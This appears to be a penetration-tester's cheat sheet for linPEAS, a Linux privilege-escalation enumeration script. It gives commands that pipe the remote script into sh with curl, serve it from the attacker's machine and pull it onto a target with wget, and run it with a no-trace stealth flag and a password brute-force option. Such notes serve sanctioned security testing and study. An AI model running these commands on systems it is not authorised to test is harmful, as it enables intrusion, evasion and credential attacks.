# linpeas
https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
## Examples
### Download from GitHub with wget
```
wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
```
### Download from github with curl
```
curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh
```
### Serve from local machine
#### Steps
##### Serve From Local
1. download
```
wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
```
1.  get ip address
```
ifconfig
```
1.  start python server
```
python -m SimpleHTTPServer 80
```
##### wget linpeas from my IP on remote machine
```
wget $MY_IP/linpeas.sh
```
### Run linpeas
1. Ensure it is executable
```
chmod 777 linpeas.sh
```
1.  Run it
```
./linpeas.sh
```
### stealthy
```
./linpeas.sh -s
```
#### -s
(superfast & stealth): This will bypass some time-consuming checks and will leave absolutely no trace.
### with password
```
./linpeas.sh -P $password
```
#### -P
(Password): Pass a password that will be used with sudo -l and Bruteforcing other users
